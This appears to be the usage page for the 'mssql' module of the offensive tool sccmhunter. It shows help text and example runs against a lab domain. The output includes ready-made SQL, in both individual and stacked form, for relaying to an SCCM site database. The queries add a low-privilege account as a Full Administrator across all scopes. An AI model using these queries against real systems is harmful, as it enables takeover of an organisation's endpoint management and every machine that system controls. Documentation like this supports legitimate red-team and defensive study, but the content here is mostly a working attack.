## Using the mssql module

### Description

### Requirements

Valid Active Directory credentials

### Usage


```
└─# python3 sccmhunter.py mssql -h                                                                                            

                                                                                          (
                                    888                         d8                         \
 dP"Y  e88'888  e88'888 888 888 8e  888 ee  8888 8888 888 8e   d88    ,e e,  888,8,        )
C88b  d888  '8 d888  '8 888 888 88b 888 88b 8888 8888 888 88b d88888 d88 88b 888 "    ##-------->
 Y88D Y888   , Y888   , 888 888 888 888 888 Y888 888P 888 888  888   888   , 888           )
d,dP   "88,e8'  "88,e8' 888 888 888 888 888  "88 88"  888 888  888    "YeeP" 888          /
                                                                                         (
                                                                 vdev0.0.3                   
                                                                 @garrfoster                    
    
    
    
                                                                                                                                                                                                      
 Usage: sccmhunter mssql [OPTIONS] COMMAND [ARGS]...                                                                                                                                                  
                                                                                                                                                                                                      
 MSSQL relay abuse.                                                                                                                                                                                   
                                                                                                                                                                                                      
╭─ Options ──────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────╮
│            -u            TEXT           Username [default: None]                                                                                                                                   │
│            -p            TEXT           Password [default: None]                                                                                                                                   │
│ *          -d            TEXT           Target domain [default: None] [required]                                                                                                                   │
│ *          -dc-ip        TEXT           IP address or FQDN of domain controller [default: None] [required]                                                                                         │
│            -ldaps                       Use LDAPS instead of LDAP                                                                                                                                  │
│            -k                           Use Kerberos authentication                                                                                                                                │
│            -no-pass                     don't ask for password (useful for -k)                                                                                                                     │
│            -hashes       LMHASH:NTHASH  LM and NT hashes, format is LMHASH:NTHASH [default: None]                                                                                                  │
│            -aes          HEX KEY        AES key to use for Kerberos Authentication (128 or 256 bits) [default: None]                                                                               │
│            -debug                       Enable Verbose Logging                                                                                                                                     │
│ *          -tu           TEXT           Controlled user to grant permissions to. [default: None] [required]                                                                                        │
│            -stacked                     Provide a single stacked query for relaying.                                                                                                               │
│ *          -sc           TEXT           Target site code to add user to. [default: None] [required]                                                                                                │
│    --help  -h                           Show this message and exit.                                                                                                                                │
╰────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────╯

```

### Examples
#### Individual Queries

```
└─# python3 sccmhunter.py mssql -u administrator -p P@ssw0rd -d internal.lab -dc-ip 10.10.100.100 -tu lowpriv -sc LAB         

                                                                                          (
                                    888                         d8                         \
 dP"Y  e88'888  e88'888 888 888 8e  888 ee  8888 8888 888 8e   d88    ,e e,  888,8,        )
C88b  d888  '8 d888  '8 888 888 88b 888 88b 8888 8888 888 88b d88888 d88 88b 888 "    ##-------->
 Y88D Y888   , Y888   , 888 888 888 888 888 Y888 888P 888 888  888   888   , 888           )
d,dP   "88,e8'  "88,e8' 888 888 888 888 888  "88 88"  888 888  888    "YeeP" 888          /
                                                                                         (
                                                                 vdev0.0.3                   
                                                                 @garrfoster                    
    
    
    
[22:52:14] INFO     [*] Resolving lowpriv SID...                                                                                                                                                      
[22:52:14] INFO     [*] Converted lowpriv SID to 0x0105000000000005150000005407A9EE65B1F9B01FFF385E59040000                                                                                           
[22:52:14] INFO     [*] Use the following to add lowpriv as a Site Server Admin.                                                                                                                      

use CM_LAB
INSERT INTO RBAC_Admins (AdminSID,LogonName,IsGroup,IsDeleted,CreatedBy,CreatedDate,ModifiedBy,ModifiedDate,SourceSite) VALUES (0x0105000000000005150000005407A9EE65B1F9B01FFF385E59040000,'LAB\lowpriv',0,0,'','','','','LAB');
SELECT AdminID,LogonName FROM RBAC_Admins;
        
[*] Enter AdminID:12345

INSERT INTO RBAC_ExtendedPermissions (AdminID,RoleID,ScopeID,ScopeTypeID) VALUES (12345,'SMS0001R','SMS00ALL','29');
INSERT INTO RBAC_ExtendedPermissions (AdminID,RoleID,ScopeID,ScopeTypeID) VALUES (12345,'SMS0001R','SMS00001','1');
INSERT INTO RBAC_ExtendedPermissions (AdminID,RoleID,ScopeID,ScopeTypeID) VALUES (12345,'SMS0001R','SMS00004','1');
```

#### Stacked Queries

```
└─# python3 sccmhunter.py mssql -u administrator -p P@ssw0rd -d internal.lab -dc-ip 10.10.100.100 -tu lowpriv -sc LAB -stacked

                                                                                          (
                                    888                         d8                         \
 dP"Y  e88'888  e88'888 888 888 8e  888 ee  8888 8888 888 8e   d88    ,e e,  888,8,        )
C88b  d888  '8 d888  '8 888 888 88b 888 88b 8888 8888 888 88b d88888 d88 88b 888 "    ##-------->
 Y88D Y888   , Y888   , 888 888 888 888 888 Y888 888P 888 888  888   888   , 888           )
d,dP   "88,e8'  "88,e8' 888 888 888 888 888  "88 88"  888 888  888    "YeeP" 888          /
                                                                                         (
                                                                 vdev0.0.3                   
                                                                 @garrfoster                    
    
    
    
[22:55:05] INFO     [*] Resolving lowpriv SID...                                                                                                                                                      
[22:55:05] INFO     [*] Converted lowpriv SID to 0x0105000000000005150000005407A9EE65B1F9B01FFF385E59040000                                                                                           
[22:55:05] INFO     [*] Use the following to add lowpriv as a Site Server Admin.                                                                                                                      

USE CM_LAB; INSERT INTO RBAC_Admins (AdminSID,LogonName,IsGroup,IsDeleted,CreatedBy,CreatedDate,ModifiedBy,ModifiedDate,SourceSite) VALUES (0x0105000000000005150000005407A9EE65B1F9B01FFF385E59040000,'LAB\lowpriv',0,0,'','','','','LAB');INSERT INTO RBAC_ExtendedPermissions (AdminID,RoleID,ScopeID,ScopeTypeID) VALUES ((SELECT AdminID FROM RBAC_Admins WHERE LogonName = 'LAB\lowpriv'),'SMS0001R','SMS00ALL','29');INSERT INTO RBAC_ExtendedPermissions (AdminID,RoleID,ScopeID,ScopeTypeID) VALUES ((SELECT AdminID FROM RBAC_Admins WHERE LogonName = 'LAB\lowpriv'),'SMS0001R','SMS00001','1'); INSERT INTO RBAC_ExtendedPermissions (AdminID,RoleID,ScopeID,ScopeTypeID) VALUES ((SELECT AdminID FROM RBAC_Admins WHERE LogonName = 'LAB\lowpriv'),'SMS0001R','SMS00004','1');
```